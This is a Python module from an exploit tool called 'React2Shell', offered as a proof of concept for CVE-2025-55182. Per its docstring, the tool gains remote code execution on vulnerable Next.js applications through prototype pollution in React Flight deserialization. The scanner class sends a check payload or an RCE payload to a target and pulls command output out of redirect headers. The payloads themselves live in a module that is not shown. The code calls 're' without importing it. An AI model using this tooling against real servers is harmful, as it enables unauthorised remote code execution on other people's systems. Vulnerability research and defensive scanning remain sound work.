"""
React2Shell - CVE-2025-55182 PoC Tool
Developed by @BlackTechX011

Exploits prototype pollution in React Flight Protocol deserialization
to achieve Remote Code Execution on vulnerable Next.js applications.
"""
from typing import Tuple, Optional
from urllib.parse import unquote
from react2shell.utils.config import Config
from react2shell.utils.http import HTTPClient
from react2shell.core.payloads import PayloadGenerator

class Scanner:
    def __init__(self, config: Config):
        self.config = config
        self.http = HTTPClient(config)
        self.payload_gen = PayloadGenerator(config)

    def scan_target(self, target: str) -> dict:
        """
        Scans a single target for vulnerability.
        """
        target = target.rstrip("/")
        
        # Prepare payload
        if self.config.check:
            body, content_type = self.payload_gen.get_safe_payload()
        else:
            body, content_type = self.payload_gen.get_rce_payload(cmd=None) # Default math check

        resp, error = self.http.send(target, data=body, ContentType=content_type)
        
        result = {
            "host": target,
            "vulnerable": False,
            "error": error,
            "status_code": resp.status_code if resp else None,
            "output": None
        }

        if error or not resp:
            return result

        # Check for vulnerability
        if self.config.check:
            # Safe check logic
            if resp.status_code == 500 and 'E{"digest"' in resp.text:
                 # Additional check for mitigations could go here
                result["vulnerable"] = True
        else:
            # RCE check logic
            redirect = resp.headers.get("X-Action-Redirect", "")
            if "11111" in redirect or "/cmd?out=" in redirect:
                 result["vulnerable"] = True
                 # Try extract output
                 match = re.search(r'/login\?a=([^;]+)', redirect)
                 if match:
                     result["output"] = unquote(match.group(1))
                 
                 match = re.search(r'/cmd\?out=([^;]+)', redirect)
                 if match:
                      result["output"] = unquote(match.group(1))

        return result
